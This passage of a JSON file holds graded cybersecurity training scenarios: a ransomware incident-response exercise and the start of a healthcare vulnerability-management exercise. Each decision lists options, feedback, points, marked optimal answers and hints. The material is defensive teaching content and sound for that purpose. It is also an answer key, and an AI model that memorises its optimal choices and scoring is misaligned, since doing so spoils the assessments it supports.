            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Contain the attack - isolate the research network segment immediately",
            "feedback": "{'short': 'Correct! Stop the active attack from spreading', 'detailed': 'With an active attack spreading every few minutes, containment is the first priority. Isolate the research network segment from the rest of the corporate network to stop lateral movement. This buys time for investigation and protects unaffected systems. Evidence can be collected after containment.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Call emergency executive briefing",
            "feedback": "{'short': \"Executives need to know, but containment can't wait\", 'detailed': \"Executive notification is important but not the FIRST action. While you're in a meeting, the attack spreads to more systems. Contain first, then notify. Delegate notification while you focus on technical response.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Shut down all servers to stop the encryption",
            "feedback": "{'short': 'Stops encryption but destroys volatile evidence', 'detailed': 'Shutdown stops encryption but: loses volatile memory evidence (running malware, network connections), may corrupt partially encrypted files, and is harder to recover from than network isolation. Network isolation stops spread while preserving system state for analysis.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "With active encryption spreading, what action stops the damage while preserving evidence?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Network isolation: stops lateral movement, preserves system state (volatile evidence), allows investigation of isolated systems. First priority in active attack."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Containment Strategy",
        "situation": "You've isolated the research network. Now you need to determine full containment strategy. The attacker came in via VPN with stolen admin credentials. The compromised admin account is jsmith_admin.\n\n**Question:** What additional containment action is MOST critical?",
        "options": [
          {
            "id": "A",
            "text": "Disable VPN for all users until further notice",
            "feedback": "{'short': 'Too broad - disrupts legitimate work unnecessarily', 'detailed': \"Disabling VPN entirely affects all remote workers and may not be necessary if the compromised credentials are addressed. More targeted containment: disable/reset the compromised account, implement emergency MFA requirement, block the source IPs. VPN shutdown may be needed but shouldn't be first action.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Disable and reset the compromised admin account immediately",
            "feedback": "{'short': \"Correct! Remove the attacker's authenticated access\", 'detailed': \"The attacker is using jsmith_admin credentials. Immediately: disable the account (prevents new logins), reset the password (invalidates current sessions on most systems), and reset any service accounts this admin manages. This removes the attacker's primary means of access. Additional credential resets will follow, but this is the immediate priority.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Block the source IP address at the firewall",
            "feedback": "{'short': 'Attacker can easily change IPs', 'detailed': 'The source IP was a Tor exit node - blocking it has minimal effect as the attacker can use different exit nodes or other infrastructure. Blocking the credential (disabling the account) is more effective than blocking the IP. IP blocking is secondary to credential action.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Begin resetting all user passwords in Active Directory",
            "feedback": "{'short': 'Mass reset causes chaos and may not be needed yet', 'detailed': 'Mass password reset disrupts all users and may not be necessary if only one account is compromised. Start with the known compromised account, then expand based on investigation findings. Mass reset may be needed later but is not the immediate priority.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The attacker is using stolen credentials. What removes that access immediately?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Disable and reset the compromised account. This cuts off the attacker's authenticated access. More surgical than VPN shutdown or mass reset."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Evidence Collection Priority",
        "situation": "The attack is contained. Now you need to collect evidence for investigation and potential legal proceedings. You have limited forensic resources. Systems are isolated but still running.\n\n**Question:** What evidence should be collected FIRST?",
        "options": [
          {
            "id": "A",
            "text": "Full disk images of all affected servers",
            "feedback": "{'short': 'Disk imaging is important but not most time-sensitive', 'detailed': \"Disk contents are persistent - they won't disappear while you collect other evidence. Memory contents, running processes, and network connections are volatile and will be lost if systems are rebooted or crash. Collect volatile evidence first, then disk images.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Memory dumps and running process information from key systems",
            "feedback": "{'short': 'Correct! Collect most volatile evidence first', 'detailed': 'Order of volatility: collect evidence that disappears fastest first. Memory contains: running malware code, decryption keys (possibly), network connections, attacker commands. This evidence is lost on reboot. Capture memory dumps from key affected systems first, then move to disk imaging. Memory analysis often reveals more than disk analysis for active incidents.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Copies of the ransom notes",
            "feedback": "{'short': 'Ransom notes are files on disk - not volatile', 'detailed': \"Ransom notes are important but they're just text files on disk - they'll be there when you get to disk imaging. Prioritize volatile evidence that won't survive a reboot.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Interview the compromised user immediately",
            "feedback": "{'short': 'Important but technical evidence takes priority', 'detailed': \"User interview is valuable but: the user's memory won't disappear in the next hour, technical volatile evidence will. Collect volatile technical evidence first, interview can happen in parallel by another team member.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What evidence will be lost if the systems crash or reboot?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Order of volatility: memory > running processes > network connections > disk. Collect memory dumps first - they contain running malware, possibly decryption keys, attacker commands."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Scope Determination",
        "situation": "Investigation reveals the attacker was in the network for 14 days before deploying ransomware. They exfiltrated approximately 200GB of data. The attack started with a phishing email to the compromised admin.\n\n**Question:** Based on this timeline, what is the KEY implication for the response?",
        "options": [
          {
            "id": "A",
            "text": "The phishing filter needs to be upgraded",
            "feedback": "{'short': 'Improvement needed but not the key implication for current response', 'detailed': \"Phishing filter improvement is a valid lesson learned but doesn't affect the current response. The key implication is about the scope of compromise and required eradication actions based on the 14-day dwell time.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Data exfiltration means this is likely double extortion - paying ransom won't prevent data leak",
            "feedback": "{'short': 'Correct! Exfiltration changes the calculus significantly', 'detailed': 'With 200GB exfiltrated, this is double extortion: pay for decryption AND pay to prevent data publication. Key implications: paying ransom may not prevent data leak (attackers often publish anyway), this affects breach notification decisions (data was accessed, not just encrypted), and incident severity increases significantly. This must inform executive decision-making and disclosure planning.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "14 days means complete credential reset is required",
            "feedback": "{'short': 'True but not the KEY implication', 'detailed': 'Credential reset is needed due to the dwell time (attacker may have harvested many credentials). But the KEY implication is the data exfiltration - it changes the entire nature of the incident from encryption-only to data breach with potential regulatory and legal consequences.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "We need to identify every system accessed in 14 days",
            "feedback": "{'short': 'Important for eradication but not the key implication', 'detailed': \"Identifying all accessed systems is necessary for eradication and scope determination. But the KEY implication is understanding that data exfiltration fundamentally changes the incident - it's now a data breach requiring notification, regardless of whether encryption is resolved.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What does data exfiltration mean for the overall incident severity and response options?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Double extortion: even if you pay for decryption or restore from backup, the data is already stolen. Attackers may still publish data. This is a data breach requiring notification."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "External Communication",
        "situation": "Margaret Torres asks who should be notified externally. The organization has cyber insurance, clinical trial data (HIPAA) is involved, the FBI has asked to be informed of ransomware incidents, and the board wants to know about media strategy.\n\n**Question:** Who should be contacted FIRST among external parties?",
        "options": [
          {
            "id": "A",
            "text": "FBI to report the ransomware attack",
            "feedback": "{'short': 'Important but legal counsel should be engaged first', 'detailed': 'FBI notification is valuable - they may have intelligence on the attacker or decryption keys. However, legal counsel should be engaged first to establish attorney-client privilege over incident communications and advise on regulatory and legal implications. FBI can be contacted shortly after legal counsel engagement.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Legal counsel (both internal and external breach counsel)",
            "feedback": "{'short': 'Correct! Legal counsel establishes privilege and guides notifications', 'detailed': 'Legal counsel first because: attorney-client privilege protects sensitive incident communications, legal counsel advises on regulatory notification requirements (HIPAA timeline, state breach laws), counsel guides interaction with law enforcement, and counsel reviews all external communications. All other notifications flow more smoothly with legal guidance.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Cyber insurance carrier to activate coverage",
            "feedback": "{'short': 'Important but typically within 24-72 hours, not immediate', 'detailed': \"Insurance notification is required (usually within 24-72 hours per policy) but isn't the first call. Legal counsel helps understand policy requirements and may participate in insurance calls. Insurance often provides approved vendors for IR - but Axiom already has a response underway.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "PR firm to manage media communications",
            "feedback": "{'short': 'Premature - no external communications until legal reviews', 'detailed': \"Media communications may be needed eventually but: no public statement should be made without legal review, the incident is still being investigated (facts aren't yet clear), and premature disclosure can create legal exposure. PR comes after legal counsel establishes communication strategy.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Which external party helps protect communications and guides other notifications?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Legal counsel first: establishes attorney-client privilege, advises on regulatory requirements, guides law enforcement interaction, reviews external communications."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Eradication Completeness",
        "situation": "You're ready to begin eradication. The attacker used the compromised admin account to access multiple systems over 14 days. They likely harvested additional credentials and may have established persistence mechanisms.\n\n**Question:** What is the MOST critical eradication action to prevent re-compromise?",
        "options": [
          {
            "id": "A",
            "text": "Remove the ransomware from affected systems",
            "feedback": "{'short': 'Necessary but not sufficient', 'detailed': 'Removing ransomware addresses the symptom, not the root cause. The attacker has valid credentials and possibly persistence mechanisms. Removing ransomware without credential reset and persistence removal means the attacker can return. Think about what enables the attacker, not just the malware.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Reset all privileged credentials including KRBTGT and service accounts",
            "feedback": "{'short': 'Correct! Eliminate all potential credential-based access', 'detailed': 'With 14 days in the environment, the attacker likely harvested many credentials. Comprehensive credential reset: all admin accounts, all service accounts, KRBTGT (twice, 10 hours apart - invalidates all Kerberos tickets), and any accounts that accessed compromised systems. Without this, the attacker retains access even after malware removal.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Patch the vulnerabilities used for initial access",
            "feedback": "{'short': 'Initial access was phishing, not vulnerability', 'detailed': \"The attack started with phishing, not a technical vulnerability. Patching is always good but doesn't address this attack vector. MFA on VPN (the secondary entry point) is more relevant. But credentials are still the most critical - attacker already has access.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Implement network segmentation",
            "feedback": "{'short': \"Important for future prevention, doesn't eradicate current access\", 'detailed': \"Segmentation is valuable for defense-in-depth but doesn't remove the attacker's current access. If they have credentials, they may still be able to access systems in their segment. Credential reset removes access; segmentation limits what they can do with access.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The attacker was in for 14 days harvesting credentials. What eradication action addresses this?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Comprehensive credential reset: all admin accounts, service accounts, KRBTGT (twice). Without this, attacker retains access regardless of malware removal."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Recovery Approach",
        "situation": "Eradication is underway. You need to decide on the recovery approach. Backups exist but haven't been tested in 18 months. The attacker may have been in backups too. Some systems were partially encrypted.\n\n**Question:** What is the SAFEST recovery approach?",
        "options": [
          {
            "id": "A",
            "text": "Restore all systems from backup immediately to minimize downtime",
            "feedback": "{'short': 'Backups may be infected or compromised', 'detailed': 'With 14-day dwell time, backups from the last 2 weeks may contain malware or attacker artifacts. Restoring without verification could re-introduce the threat. Additionally, untested backups may fail. Verify backup integrity and infection status before restoration.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Restore from backup taken before the compromise date, verify integrity, test before production",
            "feedback": "{'short': 'Correct! Use pre-compromise backup with verification', 'detailed': \"Safe recovery: identify backup from before compromise (>14 days ago), scan backup for malware artifacts, test restoration in isolated environment, verify data integrity, then restore to production. This ensures you're not restoring infected systems. Accept data loss from the period between clean backup and incident.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Attempt to decrypt files using the attacker's decryption tool",
            "feedback": "{'short': 'Risky and requires ransom payment', 'detailed': \"Using attacker-provided decryption: requires paying ransom (ethical, legal, and practical concerns), decryption tool may be malware, no guarantee it works completely, and doesn't address data exfiltration. Backup restoration is preferred when viable.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Clean and rebuild only the encrypted systems, leave others as-is",
            "feedback": "{'short': \"May leave attacker artifacts on 'unaffected' systems\", 'detailed': \"The attacker accessed many systems over 14 days - encryption was just the final act. Systems that weren't encrypted may still have malware, backdoors, or compromised credentials. Any system potentially accessed during dwell time should be treated as compromised.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The attacker was in for 14 days. What does this mean for recent backups?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Restore from pre-compromise backup (>14 days old), verify it's clean (scan for malware), test restoration, then deploy to production."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Ransom Payment Decision",
        "situation": "The executive team asks for your technical input on ransom payment. Legal and business considerations aside, they want to understand the technical implications. Backups will take 5-7 days to restore fully. The ransom is $2.1M.\n\n**Question:** What is the KEY technical factor for the ransom decision?",
        "options": [
          {
            "id": "A",
            "text": "Payment is faster than backup restoration",
            "feedback": "{'short': 'Speed is a factor but not the key technical issue', 'detailed': \"Payment might be faster, but: decryption success rate is ~70% for BlackMatter, decryption is often slow and error-prone, and you still need to rebuild trust in systems regardless. Speed alone doesn't make payment the right choice.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Data exfiltration means paying won't prevent the data breach",
            "feedback": "{'short': \"Correct! Payment doesn't solve the exfiltration problem\", 'detailed': \"The key technical factor: 200GB is already exfiltrated. Paying ransom may get decryption keys but: doesn't delete the stolen data, doesn't prevent publication, and attackers often leak anyway (or resell data). The data breach has already occurred. Payment only potentially addresses encryption, not exfiltration. This changes the value proposition significantly.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Backup restoration is 5-7 days vs. potential hours for decryption",
            "feedback": "{'short': 'Decryption time is often underestimated', 'detailed': 'Decryption sounds fast but: getting keys can take days of negotiation, decryption of large volumes is slow, errors require re-decryption, and you still need system validation. The time difference may not be as significant as it appears.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "The research data may not be in backups",
            "feedback": "{'short': 'Important consideration but backups do exist', 'detailed': \"If critical data wasn't backed up, that changes the equation. But the scenario indicates backups exist (albeit untested). The key issue is still exfiltration - even if you decrypt, the data breach has occurred.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What problem does ransom payment NOT solve in this double-extortion scenario?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Data exfiltration has already occurred. Payment might get decryption but doesn't retrieve or protect the stolen data. The breach happened regardless of payment decision."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Post-Incident Actions",
        "situation": "Recovery is complete after 8 days. Systems are restored from clean backups, credentials are reset, MFA is implemented on VPN, and enhanced monitoring is in place. Margaret asks what happens next.\n\n**Question:** What is the MOST important post-incident activity?",
        "options": [
          {
            "id": "A",
            "text": "Immediately implement all security improvements identified during the incident",
            "feedback": "{'short': 'Improvements are needed but structured approach is better', 'detailed': 'Rushing to implement changes without proper lessons learned analysis may miss root causes or create new issues. A structured post-incident review identifies prioritized improvements with proper change management. Immediate critical gaps (MFA) are already addressed; systematic improvement follows.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Conduct formal lessons learned review with all stakeholders",
            "feedback": "{'short': 'Correct! Structured review drives lasting improvement', 'detailed': \"Lessons learned review: analyze what happened (timeline, attack path), evaluate response effectiveness (what worked, what didn't), identify improvements (technical, procedural, organizational), prioritize and assign owners, and track completion. This ensures incident leads to lasting improvement rather than being forgotten once systems are restored.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Return to normal operations and move on",
            "feedback": "{'short': 'Wastes the learning opportunity', 'detailed': 'Without lessons learned, the organization may suffer similar incidents. The incident revealed gaps in detection, prevention, and response. Moving on without systematic review means those gaps remain. Every incident is a learning opportunity.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Focus on regulatory notifications and legal matters only",
            "feedback": "{'short': 'Compliance is necessary but not the only focus', 'detailed': 'Regulatory compliance (breach notifications, etc.) is required but is one aspect of post-incident activity. Lessons learned to improve defenses is equally important. Both are needed, but lessons learned drives security improvement.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What activity ensures the organization learns from the incident?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Lessons learned review: timeline reconstruction, what worked/didn't work, root cause analysis, improvement recommendations, action tracking."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Improvement Prioritization",
        "situation": "The lessons learned review identified 15 improvement recommendations. Budget and resources are limited. The board wants to know what's most important to prevent recurrence.\n\n**Question:** Which improvement should be HIGHEST priority based on this incident?",
        "options": [
          {
            "id": "A",
            "text": "Upgrade the email security gateway",
            "feedback": "{'short': \"Helpful but didn't prevent initial compromise\", 'detailed': 'Email security improvements might catch similar phishing in the future, but: phishing will always get through sometimes, and the bigger failure was post-compromise (no MFA, insufficient monitoring). Address the gaps that allowed escalation, not just initial access.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement MFA on all remote access and privileged accounts",
            "feedback": "{'short': 'Correct! Addresses the critical gap that enabled the attack', 'detailed': \"The attack succeeded because stolen credentials allowed VPN access without MFA. With MFA, the stolen password alone wouldn't have allowed access. MFA on remote access and privileged accounts directly addresses the attack vector that made this incident possible. This is the highest-impact control.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Implement EDR blocking mode instead of alert-only",
            "feedback": "{'short': \"Would have limited damage but didn't address initial access\", 'detailed': 'EDR in blocking mode would have stopped ransomware execution on one endpoint. This is valuable, but the attacker would still have had 14 days of access via compromised VPN credentials. EDR blocking is important but MFA prevents the access entirely.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Hire more security analysts",
            "feedback": "{'short': \"More analysts without better controls doesn't prevent this attack\", 'detailed': \"The issue wasn't analyst capacity - it was missing controls (MFA) and insufficient detection. More analysts won't help if they don't have the tools and data to detect attacks. Address control gaps before staffing.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What single control would have prevented the attacker from using stolen credentials?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "MFA on VPN would have stopped the attack - stolen password alone wasn't sufficient. MFA on privileged accounts adds further protection."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D4-SIM-003",
    "title": "Vulnerability Management",
    "domain": 4,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "45-60 minutes",
    "role": "Vulnerability Management Lead",
    "organization": {
      "name": "Meridian Healthcare Systems",
      "industry": "Healthcare"
    },
    "introduction": "Meridian Healthcare Systems is drowning in vulnerabilities. With nearly 13,000 open findings and no clear prioritization, everything seems urgent and nothing gets fixed. A ransomware attack at a peer hospital - exploiting a vulnerability that had a patch available for months - has the board asking hard questions. HIPAA auditors cited your vulnerability management as deficient. Sarah Mitchell has brought you in to transform the program. You have executive support, but clinical operations cannot be disrupted. How do you build a program that actually reduces risk?",
    "learning_objectives": [
      "Explain various activities associated with vulnerability management",
      "Explain the purpose of mitigation techniques used to secure the enterprise",
      "Given a scenario, use data sources to support an investigation"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Program Foundation",
        "situation": "With 12,847 open vulnerabilities and no clear process, you need to establish the foundation of a vulnerability management program. Everything seems urgent, and IT is overwhelmed.\n\n**Question:** What should be your FIRST priority in building the vulnerability management program?",
        "options": [
          {
            "id": "A",
            "text": "Immediately patch all critical vulnerabilities",
            "feedback": "{'short': 'Tactical action without program foundation', 'detailed': \"Patching critical vulnerabilities is important, but without a program structure, you'll be in the same situation next month. You need sustainable processes: prioritization framework, ownership, SLAs, and tracking. Address the program gaps, not just the current backlog.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Complete asset inventory to understand what needs protection",
            "feedback": "{'short': \"Correct! You can't protect what you don't know exists\", 'detailed': \"Asset inventory is foundational - you can't manage vulnerabilities on unknown assets. With only 70% scan coverage and unknown shadow IT, you have significant blind spots. Complete asset inventory enables: comprehensive scanning, accurate risk assessment, and accountability (every asset has an owner). Build the foundation first.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Implement a new vulnerability scanner",
            "feedback": "{'short': \"Tool change doesn't fix process problems\", 'detailed': \"Tenable.io is a capable tool - the problem isn't the scanner, it's incomplete coverage and lack of process. A new tool will face the same challenges. Focus on process and coverage before considering tool changes.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Hire more staff to handle the remediation backlog",
            "feedback": "{'short': \"Staffing without process won't solve the problem\", 'detailed': 'More staff without prioritization, SLAs, and accountability means more people working inefficiently. The problem is lack of program structure, not lack of hands. Establish the program, then right-size staffing.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What foundational element is required before you can effectively scan and prioritize?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Asset inventory: know what you have, who owns it, and its criticality. You can't protect unknown assets. Foundation for scanning, prioritization, and ownership."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Prioritization Approach",
        "situation": "With 234 critical vulnerabilities, you can't fix everything at once. IT wants to know what to work on first. Simply sorting by CVSS score has critical vulnerabilities on isolated test systems ranked the same as those on internet-facing production systems.\n\n**Question:** How should vulnerabilities be prioritized for remediation?",
        "options": [
          {
            "id": "A",
            "text": "Strictly by CVSS score - critical first, then high, etc.",
            "feedback": "{'short': \"CVSS alone doesn't account for context\", 'detailed': 'CVSS measures vulnerability severity but not organizational risk. A critical vulnerability on an isolated test system is lower actual risk than a high vulnerability on an internet-facing system with PHI. Context matters - use risk-based prioritization that considers asset criticality and exposure.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Risk-based: combine CVSS with asset criticality, exposure, and threat intelligence",
            "feedback": "{'short': 'Correct! Risk-based prioritization considers organizational context', 'detailed': 'Risk-based prioritization: CVSS (severity) \u00c3\u2014 Asset Criticality (business importance) \u00c3\u2014 Exposure (internet-facing vs. isolated) \u00c3\u2014 Threat Intelligence (actively exploited?). This focuses remediation on vulnerabilities that pose the greatest actual risk to the organization. A medium vulnerability on an internet-facing PHI system may be higher priority than a critical on an isolated test box.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "By age - oldest vulnerabilities first",
            "feedback": "{'short': \"Age doesn't indicate risk level\", 'detailed': \"Old vulnerabilities should be addressed, but age alone doesn't determine risk. A 6-month-old low vulnerability on a test system is lower priority than a 1-week-old critical on production. Use risk, not age, for prioritization. Track aging separately.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Let each system owner decide their own priorities",
            "feedback": "{'short': 'No consistency, no organizational risk view', 'detailed': 'System owners prioritize their own workload, not organizational risk. One owner might ignore critical vulnerabilities while another over-invests in low vulnerabilities. Security needs organizational risk view to set priorities across teams.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What factors beyond CVSS should influence which vulnerabilities are fixed first?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Risk-based prioritization: CVSS + asset criticality + exposure + threat intel. Context determines actual risk. EPSS (Exploit Prediction Scoring System) also helps prioritize based on likelihood of exploitation."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Remediation SLAs",
        "situation": "You need to establish SLAs for vulnerability remediation. The HIPAA auditors noted lack of defined remediation timeframes. IT pushes back that 'we'll get to it when we can.'\n\n**Question:** What is the MOST appropriate SLA for critical vulnerabilities on internet-facing systems?",
        "options": [
          {
            "id": "A",
            "text": "24-72 hours",
            "feedback": "{'short': 'Correct! Highest risk requires fastest response', 'detailed': 'Critical vulnerabilities on internet-facing systems are highest risk - directly attackable from the internet. 24-72 hours is appropriate: urgent but allows for change management and testing. Actively exploited vulnerabilities may require emergency patching within 24 hours. This aligns with industry standards and CISA KEV requirements.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "7 days",
            "feedback": "{'short': 'Too long for internet-facing critical vulnerabilities', 'detailed': '7 days may be appropriate for critical internal vulnerabilities, but internet-facing systems face immediate attack risk. Attackers often exploit new vulnerabilities within days of disclosure. 24-72 hours is more appropriate for internet-exposed critical issues.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "30 days",
            "feedback": "{'short': 'Far too long for this risk level', 'detailed': '30 days is appropriate for high-severity vulnerabilities, not critical internet-facing. A month of exposure for a critical internet-facing vulnerability is unacceptable risk. Attackers actively scan for and exploit such vulnerabilities.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Next scheduled maintenance window",
            "feedback": "{'short': 'Not risk-appropriate for critical vulnerabilities', 'detailed': 'Waiting for scheduled maintenance may mean weeks or months of exposure. Critical internet-facing vulnerabilities may require emergency maintenance windows. SLAs should drive action, not wait for convenient timing.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Internet-facing + critical severity = what level of urgency?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "CISA KEV catalog requires federal agencies to patch actively exploited vulnerabilities within 2-3 weeks. Internet-facing critical should be faster - 24-72 hours. Attackers move fast."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Medical Device Vulnerabilities",
        "situation": "The radiology system has a critical remote code execution vulnerability. The vendor says no patch is available and won't be for 6 months. The system is essential for patient care and cannot be taken offline.\n\n**Question:** What is the BEST approach for this unpatchable medical device vulnerability?",
        "options": [
          {
            "id": "A",
            "text": "Accept the risk - clinical operations must continue",
            "feedback": "{'short': 'Risk acceptance without mitigation is negligent', 'detailed': \"Simply accepting risk without compensating controls exposes the organization and patients. 'We can't patch' doesn't mean 'we can't protect.' Compensating controls can significantly reduce risk while waiting for vendor patch.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement compensating controls: network segmentation, monitoring, access restrictions",
            "feedback": "{'short': \"Correct! Compensating controls reduce risk when patching isn't possible\", 'detailed': \"When patching isn't possible, compensating controls reduce risk: network segmentation (isolate device, restrict access to only necessary systems), enhanced monitoring (detect exploitation attempts), strict access control (limit who can reach the device), and vendor pressure (document the gap, push for patch). Document controls and residual risk acceptance.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
